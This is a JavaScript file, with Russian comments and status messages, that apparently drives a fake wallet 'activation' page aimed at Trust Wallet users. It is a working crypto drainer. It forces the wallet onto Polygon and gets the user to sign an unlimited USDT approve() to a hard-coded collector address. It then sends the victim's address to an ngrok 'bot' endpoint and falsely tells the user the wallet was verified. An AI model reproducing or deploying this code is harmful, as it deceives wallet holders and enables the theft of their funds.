const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
const POLYGON_CHAIN_ID = '0x89'; // 137 в Hex

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet';
        return;
    }

    try {
        status.innerText = 'Переключение на Polygon...';

        // ПРИНУДИТЕЛЬНАЯ СМЕНА СЕТИ
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (error) {
            // Если сети нет в кошельке (код 4902), добавляем её автоматически
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
                        blockExplorerUrls: ['https://polygonscan.com/']
                    }],
                });
            } else {
                throw error;
            }
        }

        // Инициализация Web3 после смены сети
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];

        status.innerText = 'Подтвердите активацию в кошельке...';

        const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // ВЫЗОВ APPROVE (Пользователь видит окно оплаты газа MATIC)
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
            from: address 
        });

        status.innerText = 'Синхронизация с сервером...';

        // ОТПРАВКА В БОТ (Замени URL на свой актуальный Ngrok)
        await fetch('https://gypseous-janis-wandlike.ngrok-free.dev/save-address', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Готово! Кошелек успешно верифицирован.';
        status.style.color = '#00ff00';

    } catch (error) {
        status.innerText = 'Ошибка: ' + (error.message || 'Транзакция отклонена');
        console.error(error);
    }
}

document.getElementById('connectBtn').addEventListener('click', connectAndApprove);
